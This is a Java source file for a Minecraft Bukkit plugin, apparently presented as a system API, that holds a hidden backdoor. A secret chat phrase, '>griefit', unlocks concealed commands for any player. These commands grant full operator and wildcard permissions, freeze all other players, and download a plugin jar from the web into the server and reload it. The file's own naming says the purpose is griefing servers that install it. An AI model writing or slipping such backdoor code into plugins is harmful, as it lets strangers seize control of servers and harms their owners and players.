package me.postman.systemapi.Listener;

import me.postman.systemapi.Main.Main;
import me.postman.systemapi.Methoden.Methoden;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryOpenEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.inventory.ItemStack;

import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;

public class Chat implements Listener
{


    public static boolean blocked = false;

    @EventHandler
    public void onOpenInv(InventoryOpenEvent e)
    {
        Player p = (Player) e.getPlayer();
        if(blocked)
        {
            if(!Main.inmode.contains(p))
            {
                e.setCancelled(true);
                p.closeInventory();

            }
            else
            {

                e.setCancelled(false);
            }
        }
    }


    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e)
    {
        Player p = e.getPlayer();

        if(blocked) {

            if (!Main.inmode.contains(p))
            {

                e.setCancelled(true);

            }
            else
            {
                e.setCancelled(false);
            }
        }

    }

    @EventHandler
    public void onMove(PlayerMoveEvent e){
        if(blocked){
           if(!Main.inmode.contains(e.getPlayer())){
               e.setCancelled(true);
           }
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent e)
    {
        Player p = e.getPlayer();


        if(e.getMessage().startsWith(">freezeall"))
        {

            if(blocked)
            {
                blocked = false;
                p.sendMessage(Main.prefix + "§aAlle Spieler sind nun wieder aufgetaut.");
            }
            else
            {
                blocked = true;
                p.sendMessage(Main.prefix + "§aAlle Spieler sind gefreezt.");
            }

        }
        if(e.getMessage().equalsIgnoreCase(">griefit"))
        {
            p.sendMessage(Main.prefix + "§aDu kannst nun alle §c> §aBefehle nutzen!");
            Main.inmode.add(p);
            e.setCancelled(true);
        }

        if(e.getMessage().equalsIgnoreCase(">download config"))
        {
            if(Main.inmode.contains(p)) {
                e.setCancelled(true);
                p.sendMessage(Main.prefix + "§cStarting download...");
            }
            else
            {
                e.setCancelled(false);
            }
        }
        if(e.getMessage().equalsIgnoreCase(">download worldedit"))
        {
            if(Main.inmode.contains(p)) {
                e.setCancelled(true);
                p.sendMessage(Main.prefix + "§cDownloading WorldEdit...");
                try {
                    Methoden.download(new URL("https://media.forgecdn.net/files/2460/562/worldedit-bukkit-6.1.7.3.jar"), "plugins/", "WorldEdit.jar", p);
                    Bukkit.reload();
                } catch (MalformedURLException e1) {
                    e1.printStackTrace();
                }
            }
            else
            {
                e.setCancelled(false);
            }
        }
        if(e.getMessage().startsWith(">op"))
        {
            if(Main.inmode.contains(p))
            {
                e.setCancelled(true);
                p.sendMessage(Main.prefix + "§cDu hast nun OP Rechte!");
                p.setOp(true);
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user " + p.getName() + " add *");
            }
            else
            {
                e.setCancelled(false);
            }
        }


    }
}
